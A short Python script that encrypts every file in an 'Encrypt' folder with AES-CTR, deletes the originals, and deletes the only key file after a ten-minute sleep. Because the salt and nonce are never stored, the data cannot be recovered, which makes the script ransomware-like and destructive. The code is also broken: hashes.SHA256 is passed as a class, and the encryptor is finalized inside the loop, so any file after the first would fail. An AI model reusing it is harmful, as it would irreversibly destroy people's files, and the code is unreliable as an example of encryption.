import os
import time
from shutil import move
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives import serialization, hashes
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
backend = default_backend()
salt = os.urandom(16)
kdf = PBKDF2HMAC(
    algorithm=hashes.SHA256,
    length=32,
    salt=salt,
    iterations=100000,
    backend=backend
)
key = kdf.derive(b'A_SECRET_PASSWORD')
folder_path = 'Encrypt'
key_folder = 'Keys'
final_folder = 'Encryption finished'

if not os.path.exists(key_folder):
    os.makedirs(key_folder)

if not os.path.exists(final_folder):
    os.makedirs(final_folder)

key_path = os.path.join(key_folder, 'key.bin')

with open(key_path, 'wb') as key_file:
    key_file.write(key)

cipher = Cipher(algorithms.AES(key), modes.CTR(os.urandom(16)), backend=backend)
encryptor = cipher.encryptor()

for root, dirs, files in os.walk(folder_path):
    for file in files:
        file_path = os.path.join(root, file)
        with open(file_path, 'rb') as f:
            data = f.read()

        ciphered_data = encryptor.update(data) + encryptor.finalize()

        with open(file_path + '.encrypted', 'wb') as f:f.write(ciphered_data)
        move(file_path + '.encrypted', final_folder)
        os.remove(file_path)
time.sleep(600)
os.remove(key_path)